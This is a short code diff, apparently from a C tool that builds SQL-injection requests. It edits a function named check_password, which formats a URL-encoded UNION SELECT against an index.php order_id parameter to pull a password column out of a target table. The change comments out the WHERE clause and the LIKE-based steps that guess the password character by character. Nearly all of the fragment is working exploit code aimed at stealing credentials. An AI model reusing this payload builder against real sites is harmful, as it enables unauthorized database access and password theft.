@@ -278,10 +278,10 @@ bool check_password(const void *ctx) {
         "GET /index.php?order_id=0%%20UNION%%20SELECT%%20"
         "%%60%s%%60" // SELECT `pwd_col`
         "%%20FROM%%20"
-        "%%60%s%%60" // FROM `table_name`
-        "%%20WHERE%%20"
-        "%%60%s%%60" // WHERE `id_col`
-        "%%3d%%27322695107%%27%%20"
+        "%%60%s%%60%%20" // FROM `table_name`
+        //"WHERE%%20"
+        //"%%60%s%%60" // WHERE `id_col`
+        //"%%3d%%27322695107%%27%%20"
         //"AND%%20"
         //"%%60%s%%60%%20" // AND `pwd_col`...
         //"LIKE%%20%%27%s%%25%%27%%20" // ...LIKE 'discovered%'
@@ -296,9 +296,9 @@ bool check_password(const void *ctx) {
 
     sprintf(mal_req, fmt,
         d_ctx->pwd_col,
-        d_ctx->table_name,
-        d_ctx->id_col
-        /*d_ctx->pwd_col,
+        d_ctx->table_name/*,
+        d_ctx->id_col,
+        d_ctx->pwd_col,
         d_ctx->gen_ctx.discovered,
         d_ctx->pwd_col,
         d_ctx->gen_ctx.index + 1,
